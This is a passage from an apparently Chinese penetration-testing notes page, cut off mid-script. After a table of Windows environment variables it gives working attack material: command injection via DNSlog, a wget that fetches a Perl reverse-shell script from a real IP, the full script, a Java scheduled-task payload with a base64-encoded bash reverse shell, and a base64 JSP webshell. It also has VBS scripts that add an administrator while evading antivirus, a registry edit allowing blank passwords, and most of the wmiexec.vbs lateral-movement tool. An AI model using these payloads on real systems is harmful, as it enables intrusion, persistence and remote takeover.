class="line">&#x2F;&#x2F;%HOMESHARE%              系统       返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</span><br><span class="line">&#x2F;&#x2F;%LOGONSERVER%            本地       返回验证当前登录会话的域控制器的名称。</span><br><span class="line">&#x2F;&#x2F;%NUMBER_OF_PROCESSORS%   系统       指定安装在计算机上的处理器的数目。</span><br><span class="line">&#x2F;&#x2F;%OS%                     系统       返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。</span><br><span class="line">&#x2F;&#x2F;%PATH%                   系统       指定可执行文件的搜索路径。</span><br><span class="line">&#x2F;&#x2F;%PATHEXT%                系统       返回操作系统认为可执行的文件扩展名的列表。</span><br><span class="line">&#x2F;&#x2F;%PROCESSOR_ARCHITECTURE% 系统       返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。</span><br><span class="line">&#x2F;&#x2F;%PROCESSOR_IDENTFIER%    系统       返回处理器说明。</span><br><span class="line">&#x2F;&#x2F;%PROCESSOR_LEVEL%        系统       返回计算机上安装的处理器的型号。</span><br><span class="line">&#x2F;&#x2F;%PROCESSOR_REVISION%     系统       返回处理器的版本号。</span><br><span class="line">&#x2F;&#x2F;%PROMPT%                 本地       返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。</span><br><span class="line">&#x2F;&#x2F;%RANDOM%                 系统       返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。</span><br><span class="line">&#x2F;&#x2F;%SYSTEMDRIVE%            系统       返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。</span><br><span class="line">&#x2F;&#x2F;%SYSTEMROOT%             系统       返回 Windows server operating system 根目录的位置。</span><br><span class="line">&#x2F;&#x2F;%TEMP%和%TMP%            系统和用户 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。</span><br><span class="line">&#x2F;&#x2F;%TIME%                   系统       返回当前时间。使用与                                                                                   time       &#x2F;t                                                                     命令相同的格式。由         Cmd.exe                  生成。有关                       time   命令的详细信息，请参阅 Time。</span><br><span class="line">&#x2F;&#x2F;%USERDOMAIN%             本地       返回包含用户帐户的域的名称。</span><br><span class="line">&#x2F;&#x2F;%USERNAME%               本地       返回当前登录的用户的名称。</span><br><span class="line">&#x2F;&#x2F;%USERPROFILE%            本地       返回当前用户的配置文件的位置。</span><br><span class="line">&#x2F;&#x2F;%WINDIR%                 系统       返回操作系统目录的位置。</span><br></pre></td></tr></table></figure><p>Linux</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping &#96;whoami&#96;.wwgjp6.dnslog.cn&#x2F;&#x2F;换成pwd其他的命令也可以</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20210313183601293.png" alt="image-20210313183601293"></p><p>用perl反弹shell。perl是linux自带的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping &#96;wget http:&#x2F;&#x2F;47.52.31.161&#x2F;perl.pl&#96;.70c1w4.dnslog.cn&#x2F;&#x2F;下载perl反弹shell脚本</span><br><span class="line">ping &#96;perl perl.pl 47.52.31.161 9377&#96;.70c1w4.dnslog.cn&#x2F;&#x2F;反弹shell。格式：perl 脚本名 ip port</span><br></pre></td></tr></table></figure><p>脚本内容</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl -w</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> Socket;</span><br><span class="line"><span class="keyword">use</span> IO::Handle;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($#ARGV+<span class="number">1</span> != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;$#ARGV $0 Remote_IP Remote_Port n&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $remote_ip = $ARGV[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">my</span> $remote_port = $ARGV[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $proto = <span class="keyword">getprotobyname</span>(<span class="string">&quot;tcp&quot;</span>);</span><br><span class="line"><span class="keyword">my</span> $pack_addr = sockaddr_in($remote_port， inet_aton($remote_ip));</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $shell = <span class="string">&#x27;/bin/bash -i&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">socket</span>(SOCK， AF_INET， SOCK_STREAM， $proto);</span><br><span class="line"></span><br><span class="line">STDOUT-&gt;autoflush(<span class="number">1</span>);</span><br><span class="line">SOCK-&gt;autoflush(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">connect</span>(SOCK，$pack_addr) <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">&quot;can not connect:$!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">open</span> STDIN， <span class="string">&quot;&lt;&amp;SOCK&quot;</span>;</span><br><span class="line"><span class="keyword">open</span> STDOUT， <span class="string">&quot;&gt;&amp;SOCK&quot;</span>;</span><br><span class="line"><span class="keyword">open</span> STDERR， <span class="string">&quot;&gt;&amp;SOCK&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;Enjoy the shell.n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">system</span>($shell);</span><br><span class="line"><span class="keyword">close</span> SOCK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h2 id="vbs绕过360添加用户"><a href="#vbs绕过360添加用户" class="headerlink" title="vbs绕过360添加用户"></a>vbs绕过360添加用户</h2><p>2021.6.4 vbs绕过360添加用户并添加至管理员组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">set wsnetwork&#x3D;CreateObject(&quot;WSCRIPT.NETWORK&quot;)</span><br><span class="line">os&#x3D;&quot;WinNT:&#x2F;&#x2F;&quot;&amp;wsnetwork.ComputerName</span><br><span class="line">Set ob&#x3D;GetObject(os)</span><br><span class="line">Set oe&#x3D;GetObject(os&amp;&quot;&#x2F;Administrators，group&quot;)</span><br><span class="line">Set od&#x3D;ob.Create(&quot;user&quot;，&quot;admin&quot;)</span><br><span class="line">od.SetPassword &quot;123456&quot;</span><br><span class="line">od.SetInfo</span><br><span class="line">Set of&#x3D;GetObject(os&amp;&quot;&#x2F;admin&quot;，user)</span><br><span class="line">oe.add os&amp;&quot;&#x2F;admin&quot;</span><br></pre></td></tr></table></figure><p>保存为xx.vps，然后system权限下 wscript.exe xx.vbs 账密 admin 123456</p><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">struser&#x3D;wscript.arguments(0)</span><br><span class="line">strpass&#x3D;wscript.arguments(1)</span><br><span class="line"></span><br><span class="line">set lp&#x3D;createObject(&quot;WSCRIPT.NETWORK&quot;)</span><br><span class="line">oz&#x3D;&quot;WinNT:&#x2F;&#x2F;&quot;&amp;lp.ComputerName</span><br><span class="line">Set ob&#x3D;GetObject(oz)</span><br><span class="line">Set oe&#x3D;GetObject(oz&amp;&quot;&#x2F;Administrators，group&quot;)</span><br><span class="line">Set od&#x3D;ob.create(&quot;user&quot;，struser)</span><br><span class="line">od.SetPassword strpass</span><br><span class="line">od.SetInfo</span><br><span class="line">Set of&#x3D;GetObject(oz&amp;&quot;&#x2F;&quot; &amp; struser &amp; &quot;，user&quot;)</span><br><span class="line">oe.Add(of.ADsPath)</span><br><span class="line"></span><br><span class="line">For Each admin in oe.Members</span><br><span class="line">if struser&#x3D;admin.Name then</span><br><span class="line">wscript.quit</span><br><span class="line">end if</span><br><span class="line">Next</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>保存为xxx.vps，然后system权限下 wscript.exe xxx.vbs admin 1234567</p><p>另外copy net1.exe xxx.txt可以过火绒，过360还是会被提醒</p><h2 id="win设置允许空口令登录"><a href="#win设置允许空口令登录" class="headerlink" title="win设置允许空口令登录"></a>win设置允许空口令登录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Lsa&quot; &#x2F;v LimitBlankPasswordUse &#x2F;t reg_dword &#x2F;d 0 &#x2F;f</span><br></pre></td></tr></table></figure><h2 id="java后台计划任务反弹shell"><a href="#java后台计划任务反弹shell" class="headerlink" title="java后台计划任务反弹shell"></a>java后台计划任务反弹shell</h2><p>一般java后台可能会有计划任务模块，利用该模块反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(&#39;bash -c &#123;echo，YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTQuMTE4LjQuMTg0LzUzIDA+JjEK&#125;|&#123;base64，-d&#125;|&#123;bash，-i&#125;&#39;)</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20220117160338430.png" alt="image-20220117160338430"></p><p>其他数据可以参考已有的定时任务，表达式那里参考上面反弹shell的字符，执行就可以反弹shell</p><p><img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20220117160626913.png" alt="image-20220117160626913"></p><h2 id="base64写马"><a href="#base64写马" class="headerlink" title="base64写马"></a>base64写马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.20.210.60:8080&#x2F;vulns&#x2F;005-file-write.jsp?filename&#x3D;123.txt&amp;filedata&#x3D;PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTt9JT4&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.20.210.60:8080&#x2F;vulns&#x2F;004-command-2.jsp?cmd&#x3D;base64%20-d%20&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;vulns&#x2F;123.txt%20%3E%20&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;vulns&#x2F;66.jsp</span><br></pre></td></tr></table></figure><h2 id="win上vbs横向"><a href="#win上vbs横向" class="headerlink" title="win上vbs横向"></a>win上vbs横向</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br></pre></td><td class="code"><pre><span class="line">On Error Resume Next</span><br><span class="line">&#39;################################ Temp Result File ， Change it to where you like</span><br><span class="line">Const Path &#x3D; &quot;C:\&quot;</span><br><span class="line">Const FileName &#x3D; &quot;wmi.dll&quot; </span><br><span class="line">Const timeOut &#x3D; 1200</span><br><span class="line">&#39;################################</span><br><span class="line">file &#x3D; Path &amp; &quot;\&quot; &amp; FileName</span><br><span class="line">file &#x3D; Replace(file，&quot;\\&quot;，&quot;\&quot;)</span><br><span class="line">Set fso &#x3D; CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">FilePath &#x3D; fso.GetParentFolderName(file) &#39;for wmi create share</span><br><span class="line">&#39;WScript.Echo FilePath</span><br><span class="line"></span><br><span class="line">WAITTIME &#x3D; timeOut              &#39;ms  time to execute command ，read result file after 1200ms</span><br><span class="line"></span><br><span class="line">Set objArgs &#x3D; WScript.Arguments</span><br><span class="line">intArgCount &#x3D; objArgs.Count </span><br><span class="line">If intArgCount &lt; 2 Or intArgCount &gt; 5 Then</span><br><span class="line">WScript.Echo </span><br><span class="line">WScript.Echo &quot;   $$\      $$\ $$\      $$\ $$$$$$\ $$$$$$$$\ $$\   $$\ $$$$$$$$\  $$$$$$\  &quot;</span><br><span class="line">WScript.Echo &quot;   $$ | $\  $$ |$$$\    $$$ |\_$$  _|$$  _____|$$ |  $$ |$$  _____|$$  __$$\ &quot;</span><br><span class="line">WScript.Echo &quot;   $$ |$$$\ $$ |$$$$\  $$$$ |  $$ |  $$ |      \$$\ $$  |$$ |      $$ &#x2F;  \__|&quot;</span><br><span class="line">WScript.Echo &quot;   $$ $$ $$\$$ |$$\$$\$$ $$ |  $$ |  $$$$$\     \$$$$  &#x2F; $$$$$\    $$ |      &quot;</span><br><span class="line">WScript.Echo &quot;   $$$$  _$$$$ |$$ \$$$  $$ |  $$ |  $$  __|    $$  $$&lt;  $$  __|   $$ |      &quot;</span><br><span class="line">WScript.Echo &quot;   $$$  &#x2F; \$$$ |$$ |\$  &#x2F;$$ |  $$ |  $$ |      $$  &#x2F;\$$\ $$ |      $$ |  $$\ &quot;</span><br><span class="line">WScript.Echo &quot;   $$  &#x2F;   \$$ |$$ | \_&#x2F; $$ |$$$$$$\ $$$$$$$$\ $$ &#x2F;  $$ |$$$$$$$$\ \$$$$$$  |&quot;</span><br><span class="line">WScript.Echo &quot;   \__&#x2F;     \__|\__|     \__|\______|\________|\__|  \__|\________| \______&#x2F; &quot;</span><br><span class="line">WScript.Echo &quot;                                               v1.1dev        By. Twi1ight   &quot;</span><br><span class="line">WScript.Echo &quot; Usage:&quot; &amp; _</span><br><span class="line">vbTab &amp; &quot;wmiexec.vbs  &#x2F;shell  host&quot; &amp; _</span><br><span class="line">vbNewLine &amp; vbTab &amp; &quot;wmiexec.vbs  &#x2F;shell  host  user  pass&quot; &amp; _</span><br><span class="line">vbNewLine &amp; vbTab &amp; &quot;wmiexec.vbs  &#x2F;cmd  host  command&quot; &amp; _</span><br><span class="line">vbNewLine &amp; vbTab &amp; &quot;wmiexec.vbs  &#x2F;cmd  host  user  pass  command&quot; &amp; vbNewLine &amp; _</span><br><span class="line">vbNewLine &amp; vbTab &amp; &quot;  &#x2F;shell&quot;  &amp; vbTab &amp; &quot;half-interactive shell mode&quot; &amp; _</span><br><span class="line">vbNewLine &amp; vbTab &amp; &quot;  &#x2F;cmd&quot; &amp; vbTab &amp; vbTab &amp; &quot;single command mode&quot; &amp; _</span><br><span class="line">vbNewLine &amp; vbTab &amp; &quot;  host&quot; &amp; vbTab &amp; vbTab &amp; &quot;hostname or IP address&quot; &amp; _</span><br><span class="line">vbNewLine &amp; vbTab &amp; &quot;  command&quot; &amp; vbTab &amp; &quot;the command to execute on remote host&quot; &amp; _</span><br><span class="line">vbNewLine &amp; vbNewLine &amp; vbTab &amp; &quot;  -waitTIME&quot; &amp; vbTab &amp; _</span><br><span class="line"> &quot;[both mode] ，delay TIME to read result，&quot;&amp; vbNewLine &amp; vbTab &amp; _</span><br><span class="line"> vbTab &amp; vbTab &amp;&quot;eg. &#39;systeminfo -wait5000&#39; &#39;ping google.com -wait2000&#39;&quot; &amp; _</span><br><span class="line">vbNewLine &amp; vbTab &amp; &quot;  -persist&quot; &amp; vbTab &amp; _</span><br><span class="line"> &quot;[both mode] ，running command background and persistent&quot; &amp; vbNewLine &amp; vbTab &amp; _</span><br><span class="line"> vbTab &amp; vbTab &amp;&quot;such as nc.exe or Trojan&quot; </span><br><span class="line">WScript.Quit()</span><br><span class="line">End If</span><br><span class="line"></span><br><span class="line">If LCase(objArgs.Item(0)) &lt;&gt; &quot;&#x2F;cmd&quot; And LCase(objArgs.Item(0)) &lt;&gt; &quot;&#x2F;shell&quot; Then </span><br><span class="line">WScript.Echo &quot;WMIEXEC ERROR: Wrong Mode Specified!&quot;</span><br><span class="line">WScript.Quit</span><br><span class="line">End If</span><br><span class="line">boolShellMode &#x3D; True</span><br><span class="line">If LCase(objArgs.Item(0)) &#x3D; &quot;&#x2F;cmd&quot; Then boolShellMode &#x3D; False</span><br><span class="line">If boolShellMode &#x3D; False Then command &#x3D; objArgs.Item(intArgCount - 1)</span><br><span class="line"></span><br><span class="line">host &#x3D; objArgs.Item(1)</span><br><span class="line">If intArgCount &gt; 3 Then </span><br><span class="line">user &#x3D; objArgs.Item(2)</span><br><span class="line">pass &#x3D; objArgs.Item(3)</span><br><span class="line">Set objShell &#x3D; CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">strNetUse &#x3D; &quot;cmd.exe &#x2F;c net use \\&quot; &amp; host &amp; &quot; &quot;&quot;&quot; &amp; pass &amp; &quot;&quot;&quot; &quot; &amp; &quot;&#x2F;user:&quot; &amp; user</span><br><span class="line">&#39;WScript.Echo strNetUse</span><br><span class="line">objShell.Run strNetUse，0</span><br><span class="line">End If</span><br><span class="line">&#39;Output Status</span><br><span class="line">WScript.Echo &quot;WMIEXEC : Target -&gt; &quot; &amp; host</span><br><span class="line">WScript.Echo &quot;WMIEXEC : Connecting...&quot;</span><br><span class="line"></span><br><span class="line">Set objLocator &#x3D; CreateObject(&quot;wbemscripting.swbemlocator&quot;)</span><br><span class="line">If intArgCount &gt;2 Then</span><br><span class="line">set objWMIService &#x3D; objLocator.connectserver(host，&quot;root&#x2F;cimv2&quot;，user，pass)</span><br><span class="line">Else</span><br><span class="line">Set objWMIService &#x3D; objLocator.ConnectServer(host，&quot;root&#x2F;cimv2&quot;)</span><br><span class="line">End If</span><br><span class="line">If Err.Number &lt;&gt; 0 Then</span><br><span class="line">WScript.Echo &quot;WMIEXEC ERROR: &quot; &amp; Err.Description </span><br><span class="line">WScript.Quit</span><br><span class="line">End If</span><br><span class="line">WScript.Echo &quot;WMIEXEC : Login -&gt; OK&quot;</span><br><span class="line">WScript.Echo &quot;WMIEXEC : Result File -&gt; &quot; &amp; file</span><br><span class="line"></span><br><span class="line">boolPersist &#x3D; False</span><br><span class="line">&#39;Create Share</span><br><span class="line">CreateShare()</span><br><span class="line">CurrentFolder &#x3D; Null</span><br><span class="line">&#39;-----single Command mode------</span><br><span class="line">If boolShellMode &#x3D; False Then</span><br><span class="line">WAITTIME &#x3D; 5000</span><br><span class="line">WScript.Echo vbNewLine &amp; vbTab &amp; host &amp; &quot;  &gt;&gt;  &quot; &amp; command</span><br><span class="line">boolGetFolder &#x3D; False</span><br><span class="line">strResult &#x3D; PhraseCmd( command )</span><br><span class="line">&#39;WScript.Echo strResult</span><br><span class="line">If strResult &#x3D; &quot;persist&quot; Then</span><br><span class="line">boolPersist &#x3D; True</span><br><span class="line">Exec command，&quot;nul&quot;</span><br><span class="line">Else</span><br><span class="line">Exec command， file</span><br><span class="line">ReadResult()</span><br><span class="line">End If</span><br><span class="line">If intArgCount &gt; 3 Then </span><br><span class="line">Set objShell &#x3D; CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">strNetUse &#x3D; &quot;cmd.exe &#x2F;c net use \\&quot; &amp; host &amp; &quot; &#x2F;del&quot;</span><br><span class="line">objShell.Run strNetUse，0</span><br><span class="line">End If</span><br><span class="line">DeleteShare()</span><br><span class="line">WScript.Quit</span><br><span class="line">End If</span><br><span class="line">&#39;------------------------------</span><br><span class="line"></span><br><span class="line">&#39;++++++++shell mode++++++++++++</span><br><span class="line">&#39;get current working directory</span><br><span class="line">boolGetFolder &#x3D; True</span><br><span class="line">CurrentFolder &#x3D; Exec(&quot;cd&quot;， file)</span><br><span class="line"></span><br><span class="line">&#39;WScript.Echo CurrentFolder</span><br><span class="line">Do While True</span><br><span class="line">boolPersist &#x3D; False</span><br><span class="line">WAITTIME &#x3D; timeOut</span><br><span class="line">wscript.stdout.write(CurrentFolder &amp; &quot;&gt;&quot;)</span><br><span class="line">command &#x3D; wscript.stdin.ReadLine</span><br><span class="line">&#39;press &#39;Enter&#39; directorly</span><br><span class="line">Do While command &#x3D; &quot;&quot;</span><br><span class="line">wscript.stdout.write(CurrentFolder &amp; &quot;&gt;&quot;)</span><br><span class="line">command &#x3D; wscript.stdin.ReadLine</span><br><span class="line">Loop</span><br><span class="line">If LCase(Trim(command)) &#x3D; &quot;exit&quot; Then Exit Do</span><br><span class="line">&#39;If Not IsEmpty(command) Then </span><br><span class="line">&#39;process &#39;cd&#39; command--------&gt;&gt;&gt;&gt;</span><br><span class="line">strResult &#x3D; PhraseCmd( command )</span><br><span class="line">If strResult &#x3D; &quot;cd&quot; Then </span><br><span class="line">command &#x3D; command &amp; &quot; &amp; cd &quot;</span><br><span class="line">boolGetFolder &#x3D; True</span><br><span 